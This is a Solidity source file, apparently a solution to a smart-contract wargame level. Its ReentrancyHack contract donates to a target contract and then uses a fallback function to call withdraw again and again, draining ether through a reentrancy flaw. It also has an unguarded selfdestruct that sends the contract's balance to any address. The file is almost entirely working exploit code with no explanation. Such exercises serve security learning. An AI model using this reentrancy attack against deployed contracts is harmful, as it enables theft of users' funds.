// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/console.sol";

interface IReentrance {
    function withdraw(uint _amount) external;

    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint);
}

contract ReentrancyHack {
    IReentrance reentrance;

    constructor(address _reentrance) public {
        reentrance = IReentrance(_reentrance);
    }

    fallback() external payable {
        if (reentrance.balanceOf(address(this)) >= 1 ether) {
            reentrance.withdraw(1 ether);
        }
    }

    function donate() external payable {
        reentrance.donate.value(msg.value)(address(this));
    }

    function withdraw(uint _amount) external {
        reentrance.withdraw(_amount);
    }

    function killMe(address _to) external {
        selfdestruct(payable(_to));
    }
}
